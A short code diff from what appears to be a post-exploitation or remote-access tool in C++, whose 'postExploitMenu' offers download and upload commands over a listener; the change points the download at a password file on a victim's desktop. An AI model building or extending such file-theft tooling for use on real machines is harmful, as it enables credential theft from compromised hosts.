@@ -17,7 +17,7 @@ void postExploitMenu(listener *newL) {
 		getline(cin,cmd);
 		if(!cmd.compare("download")){
 			printf("You Selected Download\n");
-			newL->downloadFile("C:\\\\Users\\\\john\\\\Desktop\\\\download.txt", "download.txt");
+			newL->downloadFile("C:\\Users\\Ricardo\\Desktop\\CF\\password.txt", "download.txt");
 		}
 		if (!cmd.compare("upload")){
 			printf("You Selected Upload\n");
